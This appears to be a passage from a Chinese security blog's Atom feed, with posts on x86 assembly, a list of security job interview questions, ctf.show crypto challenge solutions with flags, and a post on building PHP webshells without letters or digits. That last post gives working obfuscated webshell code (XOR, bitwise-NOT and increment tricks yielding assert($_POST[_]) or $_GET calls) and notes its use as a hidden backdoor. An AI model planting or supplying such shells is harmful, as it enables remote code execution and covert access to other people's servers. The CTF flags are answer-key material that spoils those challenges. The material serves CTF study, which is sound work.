    <published>2020-04-20T01:23:24.000Z</published>
    <updated>2020-04-22T02:59:53.415Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mul和div"><a href="#mul和div" class="headerlink" title="mul和div"></a>mul和div</h2><p><strong>mul指令</strong></p><ol><li>两个相乘的数，如果都为8位，其中一个默认存放在AL，另一个放在8位寄存器或者内存字节单元中，结果是16位的，默认存放在AX中</li><li>两个相乘的数，如果都为16位，其中一个默认存放在AX，另一个放在16位寄存器或者内存字单元中，结果是32位的，高位默认存放在DX中，低位存放在AX中</li></ol><p><strong>div指令</strong></p><ol><li>除数有8位和16位，存放在reg或者内存单元</li><li>除数为8位，被除数为16位，被除数默认存放在AX中。除数为16位，被除数为32位，被除数高位存放在DX中，低位存放在AX中</li><li>结果，除数为8位，商存储在AL，余数存储在AH。除数为16位，商存储在AX，余数存储在DX</li></ol><h2 id="实验九-打印"><a href="#实验九-打印" class="headerlink" title="实验九 打印"></a>实验九 打印</h2><p>打印helloworld</p><p>尤其要注意 <code>mov al, [bp]</code>，这里是取出</p><pre><code class="asm">assume cs:codedata segment    db &#39;Hello World&#39;    db 24h    dw 1824 data endscode segmentstart:    mov ax,data    mov ds,ax    mov ax, 0b800h    mov es, ax    mov si,0    mov di,0    mov bx, ds:[12]    mov bp, ds:[11]    mov cx, 11s:    mov al, ds:[si]    mov es:[bx+di], al    mov al, [bp]    mov es:[bx+di+1], al    inc si    add di,2    loop s    mov ax,4c00h    int 21hcode endsend start</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mul和div&quot;&gt;&lt;a href=&quot;#mul和div&quot; class=&quot;headerlink&quot; title=&quot;mul和div&quot;&gt;&lt;/a&gt;mul和div&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;mul指令&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;两个相乘的数，如果都为8位，
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="http://prontosil.com/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>春招面经汇总</title>
    <link href="http://prontosil.com/posts/ddd168ac/"/>
    <id>http://prontosil.com/posts/ddd168ac/</id>
    <published>2020-04-19T23:44:35.000Z</published>
    <updated>2020-04-25T13:57:21.240Z</updated>
    
    <content type="html"><![CDATA[<p>从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗</p><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><ol><li>自我介绍</li><li>tomcat AJP漏洞了解过吗</li><li>Java反序列化漏洞</li><li>JNDI注入，Java7和Java8的区别(这里确实是自己挖坑了，简历上写了自己会Java审计，JNDI注入等，但是并没有仔细准备，结果面试官抓着Java不放)</li><li>XXE如果无法联网怎么利用(三层嵌套报错XXE或者利用系统自带的DTD文件)</li><li>你比较擅长的方面</li></ol><p>不知道为啥和长亭面试官聊起来挺尬的。最后也只面试了20分钟就结束了，当然结果是凉凉了</p><h2 id="字节跳动-企业应用安全"><a href="#字节跳动-企业应用安全" class="headerlink" title="字节跳动-企业应用安全"></a>字节跳动-企业应用安全</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>具体的一个代码审计案例</li><li>说一下你知道的四种漏洞的原理，利用，危害和防御</li><li>XSS知道吗</li><li>说一下前端漏洞中你比较熟悉的</li><li>python沙盒逃逸</li><li>你觉得自己的优势是什么</li><li>对未来的规划</li></ol><p>字节跳动一面官感觉挺棒的，全程在引导你，而且特别尊重你说出自己的看法</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>简单问了几个小问题，python沙盒逃逸，JavaScript原型链污染</li><li>有没有了解过electron框架（就是开发vscode的，我说没有，但是我知道vue</li><li>vue怎么防御csrf(我不太了解vue怎么防范，先说一些怎么防CSRF balabal)</li><li>提示vue是通过ajax和后端连接，我：哦想起来了，那就用CORS来防御，然后说了CORS的防御</li><li>继续问。CORS分为简单请求和非简单请求，一个POST请求怎么区分</li><li>java做过哪些</li><li>mXSS了解吗</li><li>参数压栈入栈简单说下</li><li>你怎么将CTF学到的用到实战</li><li>go有没有了解</li></ol><p>二面面试官也挺棒的，唯一的问题就是。。。他家的小孩子太吵了。。几次打断我的思路</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面是部门leader面，本来以为会继续问技术的，结果。。问了一堆人生相关的问题，而且回答的不好，没有完全表现出自己的水平。。</p><ol><li>第一次打CTF的经历(就是由于一开始的这个问题导致我后面都在说CTF，可能leader觉得我的眼界太小了吧)</li><li>你对未来的规划(这种问题真心不好回答)</li><li>你是怎么选择上这个专业的</li><li>你认为你还有哪些技能需要完善</li><li>你觉得学习编程语言需要注意哪些</li><li>go的垃圾回收机制(这个真是自己多嘴了，不该说自己学了点go的，这个问题没答上来)</li><li>go的并发机制有哪些(我就知道channel。。)</li></ol><p>周五面试完，下周一结果出来后就凉凉了，之后转岗到安全与风控部门，结果这是个开发岗，问的问题都是和编程有关的</p><p>只记录了几个问题：</p><ol><li>http1.0和1.1的区别</li><li>hashtable的原理</li><li>进程和线程的区别</li><li>进程间通信的方式</li><li>hash冲突解决</li><li>tcp和udp协议</li><li>用c语言实现双链表的插入和删除</li></ol><p>面试了一个多小时。。最后面试官说看了我的博客觉得我在漏洞挖掘，渗透这块还行，建议我投其他的部门，我说我就是转岗过来的。。。</p><h2 id="知道创宇-404实验室"><a href="#知道创宇-404实验室" class="headerlink" title="知道创宇 - 404实验室"></a>知道创宇 - 404实验室</h2><p>知道创宇是3月5号投递的，结果3月底才安排面试，以至于我都忘记投递了。</p><ol><li>分享几个cms漏洞挖掘的案例</li><li>代码审计的思路</li><li>假设一个cms你找到了一个反序列化的入口，如何挖掘POP链</li><li>如果cms中找不到POP链怎么利用(不知道，面试官告诉我可以用内置的类进行反序列化)</li><li>印象最深的一道CTF题</li><li>解释一下js的原型链污染</li><li>说一下你对tomcat AJP漏洞的分析</li><li>除了CTF，代码审计你还从哪里学安全知识</li><li>储存型XSS但是httponly了怎么利用</li><li>说一下redis主从复制漏洞</li><li>解释一下python的全局变量锁</li><li>python什么时候会用到多线程，什么时候用到多进程</li><li>为什么python的多线程是伪多线程</li><li>开发一个cms自动化代码审计的工具你有哪些思路</li></ol><h2 id="腾讯-应用运维安全"><a href="#腾讯-应用运维安全" class="headerlink" title="腾讯-应用运维安全"></a>腾讯-应用运维安全</h2><p>我后来才知道腾讯面试的流程，首先有一个公共的简历池，之后每个部门在里面捞简历，一般看到一份还行的简历会打电环了解一下情况(所以我接了好几个了解情况的电话)，之后如果要面试的话需要锁定这一份简历，这样的话其他部门就无法面试你，只有锁定简历的部门才行。</p><p>两轮电话了解情况之后，我的简历投到了应用运维安全，具体哪个事业群不知道</p><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol><li>入侵响应</li><li>重置密码逻辑漏洞</li><li>RMI 利用的一个流程</li><li>flask SSTI 漏洞</li><li>XSS怎么防护</li><li>CSP如何绕</li><li>安全开发流程</li><li>JavaScript 闭包</li><li>常用远程控制软件</li><li>SQL过滤了单引号怎么绕过</li><li>SQL注入如何防护</li><li>Linux查看进程和查看端口的命令</li></ol><p>之后网申的页面提示进入了复试阶段，但是一直没更新。直到变灰。</p><h2 id="腾讯-后台策略安全"><a href="#腾讯-后台策略安全" class="headerlink" title="腾讯-后台策略安全"></a>腾讯-后台策略安全</h2><p>本来以为腾讯没希望了，人都去新疆给做培训了，结果腾讯微信事业群联系我问有没有意向</p><h3 id="4-9-0面"><a href="#4-9-0面" class="headerlink" title="4.9 0面"></a>4.9 0面</h3><p>问了大概一个多小时，感觉就是提前了解情况，后来才知道也不是一面。姑且叫做0面好了，面完之后也没有做记录，只有靠回忆了</p><ol><li>说一下python沙盒逃逸</li><li>了解过nodejs的沙盒逃逸吗</li><li>说一下JavaScript原型链污染</li><li>dll注入了解过吗</li><li>二进制程序常见的壳，脱壳的方法</li><li>了解过大数据吗</li><li>编程题: 将一个数组的奇数移到前面，偶数移到后面</li></ol><h3 id="4-11-一面"><a href="#4-11-一面" class="headerlink" title="4.11 一面"></a>4.11 一面</h3><ol><li>https和http的区别</li><li>http怎么防止运营商篡改你的流量</li><li>操作系统进程通信方式</li><li>XSS和CSRF</li><li>二次注入</li><li>web安全有没有总结一些方法论什么的</li><li>操作系统的最小调度单位是什么，操作系统资源分配的最小单位是什么，如果一个进程crash了，它的线程会发生什么</li><li>tcp为啥要三次握手，两次和四次不行吗</li><li>脱壳的方式</li><li>编程题：二分查找</li></ol><h3 id="4-13-二面"><a href="#4-13-二面" class="headerlink" title="4.13 二面"></a>4.13 二面</h3><p>这一面感觉面的挺尬的，面完后还觉得自己凉了，面完之后每天都忍不住去看官网的状态</p><ol><li>有没有渗透攻防经历</li><li>逆向了解过哪些</li><li>小程序游戏，比如跳一跳，怎么防止查重</li><li>二进制安全学习过哪些.</li><li>java安全学习过哪些</li><li>apk逆向了解不</li><li>java的hashtable实现原理</li><li>hash泛洪攻击了解吗</li><li>tcp泛红攻击</li><li>你认为你相比其他人的优势</li><li>你玩过哪些微信游戏</li><li>内容安全了解吗</li><li>编程题：数组去重</li></ol><h3 id="4-17-三面"><a href="#4-17-三面" class="headerlink" title="4.17 三面"></a>4.17 三面</h3><p>第一次在机场面试。。实在是没办法，这是腾讯校招的最后一天必须得面完</p><p>然而面试官问我的问题我都没听明白</p><ol><li>怎么检测开发者绕过我们设定的策略</li><li>如何检测内容安全</li><li>如何防止外挂</li><li>你还有什么补充的(然后我就开始跑火车了)</li></ol><p>由于在机场，面试也只持续了半个小时左右</p><h3 id="4-18-hr面"><a href="#4-18-hr面" class="headerlink" title="4.18 hr面"></a>4.18 hr面</h3><ol><li>你认为你相对别人的优势</li><li>之前没有实习经历</li><li>之前有投递过其他的安全公司吗</li><li>你觉得这个岗位和你相契合吗</li><li>你父母的工作，你父母对你的影响</li></ol><p>聊了大概大概十分钟，面试官声音很有特点。面试的邀请函都是4.18号凌晨发过来的，估计在加班hhhh</p><h2 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h2><p>2月底的时候看到博客园的一个师傅，首页上写着阿里云云安全团队长期招收实习生，于是联系了他，做了一次简单的非正式面试，校招开始的时候也是他帮我内推的</p><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><p>一面很水，不到二十分钟，感觉就是简单了解了情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol><li>渗透测试有没有做过</li><li>怎么检测反弹shell</li><li>怎么检测黑客入侵Linux服务器</li><li>structs2漏洞说一下 </li><li>cms审计说一说</li><li>系统提权说一说</li><li>有没有做过演讲</li><li>安全方面有哪些成就</li><li>IOT哪些产出</li></ol><p>答得不是很好，结果凉凉</p><h2 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h2><h3 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h3><p>华为这次笔试感觉真的难，只有单选，不定项选(少选不给分)，和一道编程题</p><ol><li>fuzz框架考了很多，而且都是问用处，但是我都不知道</li><li>Linux的操作也考了一些，比如 <code>/etc/profile</code> 文件中设置的环境变量对所有用户都生效</li><li>web安全，有直接给源码问你漏洞点的，还有一些基本概念，这个反倒是不难</li><li>二进制安全，有一道直接考ROP链的，让你选择栈布局</li></ol><p>不知道还有没有后续的面试</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>校招还是比较看重基础，但是对于偏乙方的比如长亭和知道创宇可能要求你有一些比较擅长的点，而且会问的比较细。大厂主要是看你的基础知识是不是很扎实。感觉面试的很多问题都是可以直接从网上找到答案的，但是还是要拿来问emmm。最后，感觉面试真是3分运气，7分实力，不过不到最后也不要轻言放弃，万一呢，万一呢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗&lt;/p&gt;
&lt;h2 id=&quot;长亭&quot;&gt;&lt;a href=&quot;#长亭&quot; class=&quot;headerlink&quot; title=&quot;长亭&quot;&gt;&lt;/a&gt;长亭&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;自我介绍&lt;/li&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="生活" scheme="http://prontosil.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="面经" scheme="http://prontosil.com/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>密码学题目</title>
    <link href="http://prontosil.com/posts/1dea6763/"/>
    <id>http://prontosil.com/posts/1dea6763/</id>
    <published>2020-04-18T07:21:05.000Z</published>
    <updated>2020-06-06T06:06:56.793Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下ctf.show平台</p><p><a href="https://ctf.show/challenges" target="_blank" rel="noopener">https://ctf.show/challenges</a></p><h2 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h2><p>凯撒密码</p><p><img src="/posts/1dea6763/1586531882516-1587195417553.png" alt></p><h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p><p><img src="/posts/1dea6763/1587194700279.png" alt></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>还是jsfuck编码</p><p><img src="/posts/1dea6763/1587194728413.png" alt></p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p>p=447685307 q=2037 e=17</p><p>提交flag{d}即可</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e 求d&#39;&#39;&#39;# p = 3487583947589437589237958723892346254777# q = 8767867843568934765983476584376578389# e = 65537p=18443q=49891e=19phin = (p - 1) * (q - 1)print gmpy2.invert(e, phin)</code></pre><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>p=447685307 q=2037 e=17 c=704796792</p><p>提交flag{m}</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e,c 求d和m&#39;&#39;&#39;p=447685307q=2037e=17c=704796792phin = (p - 1) * (q - 1)d = gmpy2.invert(e, phin)print pow(c,d,p*q)</code></pre><h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p>ook解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><pre><code>flag{b615c4b79a1aede83b9ae67104ff4eb5}</code></pre><h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>brainfuck解密</p><pre><code>flag{99754106633f94d350db34d548d6091a}</code></pre><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>密码是4132</p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p><img src="/posts/1dea6763/1586560529022.png" alt></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><p>邮件编码</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>解密后就是ctf</p><h2 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h2><p>混合加密</p><pre><code class="python">import base64def base(s):    try:        s = base64.b32decode(s)        s = base(s)    except:        try:            s = base64.b64decode(s)            s = base(s)        except:            return s    return sf = open(&#39;base.txt&#39;)text = f.read()print(base(text))</code></pre><p>flag{b4Se_Fami1y_Is_FUn}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下ctf.show平台&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf.show/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.show/challenges&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;cr
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://prontosil.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字webshell</title>
    <link href="http://prontosil.com/posts/bed5b94f/"/>
    <id>http://prontosil.com/posts/bed5b94f/</id>
    <published>2020-04-05T08:08:20.000Z</published>
    <updated>2020-04-21T04:23:37.265Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="php">&lt;?phpif(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) {  eval($_GET[&#39;shell&#39;]);}</code></pre><h2 id="通过异或"><a href="#通过异或" class="headerlink" title="通过异或"></a>通过异或</h2><p>原理</p><pre><code class="php">php &gt; echo chr(0x01)^&#39;`&#39;;aphp &gt; echo chr(0x13)^&#39;`&#39;;sphp &gt; echo chr(0x05)^&#39;`&#39;;e</code></pre><p>所以即可构造：</p><pre><code class="php">$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); //$_=assert$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__ = _POST$___=$$__; //$___ = $_POST$_($___[_]);// assert($_POST[_])</code></pre><p>在 <code>php5.5.38</code> 通过测试</p><p><img src="/posts/bed5b94f/1586074270072.png" alt></p><p>但是如果切换为 <code>php7.1.3</code> 执行失败</p><p><img src="/posts/bed5b94f/1586074316094.png" alt></p><h3 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h3><p>通过这种方式可以构造异或形式的webshell</p><pre><code class="php">&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST     ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);?&gt;</code></pre><pre><code>0=assert&amp;1=phpinfo()</code></pre><p>在 AWD 中常用来做隐藏的shell</p><p><img src="/posts/bed5b94f/1586074779485.png" alt></p><p>当然这种马是直接被杀的</p><p><img src="/posts/bed5b94f/1586074826727.png" alt></p><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;])){    $code = $_GET[&#39;code&#39;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_12" target="_blank" rel="noopener">参考</a></p><pre><code>&lt;?php    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p><ul><li><code>?</code> 代表匹配一个字符</li><li>``` 表示执行命令</li><li><code>&quot;</code> 对特殊字符串进行解析</li></ul><p>这样就可以直接得到 </p><pre><code>php &gt; echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;_GET</code></pre><p>然后再构造</p><pre><code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code></pre><p>这样就构造好了shell</p><p><img src="/posts/bed5b94f/1586075401555.png" alt></p><h2 id="通过取反"><a href="#通过取反" class="headerlink" title="通过取反"></a>通过取反</h2><pre><code class="php">&lt;?php$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);</code></pre><h2 id="通过加法运算"><a href="#通过加法运算" class="headerlink" title="通过加法运算"></a>通过加法运算</h2><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
if(!preg_match(&amp;#39;/[a-z0-9]/is&amp;#39;,$_GET[&amp;#39;shell&amp;#39;])) {
  eval($_GET[&amp;#39;shell&amp;#39;]);
}&lt;/code&gt;&lt;/p
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="webshell" scheme="http://prontosil.com/tags/webshell/"/>
    
  </entry>
  
</feed>
